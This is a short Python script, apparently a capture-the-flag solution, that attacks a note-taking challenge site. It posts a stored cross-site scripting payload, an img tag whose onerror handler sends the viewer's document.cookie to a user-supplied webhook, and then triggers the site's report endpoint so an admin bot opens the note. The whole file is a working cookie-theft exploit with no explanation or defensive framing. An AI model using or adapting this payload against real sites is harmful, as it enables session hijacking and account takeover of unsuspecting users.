import requests as r

url = input("Give link to chall website: ")

wh = input("Give link to webhook: ")

print(f"{url}/")
r1 = r.get(f"{url}/", data={}, headers = {})
uid = r1.url.split("/")[4]
cookie = "user=" + r1.url.split("/")[4]
print(cookie)

data = {
    "note": f"<img src='x' onerror=\"window.location = '{wh}?a=' + document.cookie\">"
}

headers = {
    "Cookie" : cookie
}

resp = r.post(f"{url}/create/", data=data, headers=headers)

resp = r.get(f"{url}/report/{uid}")
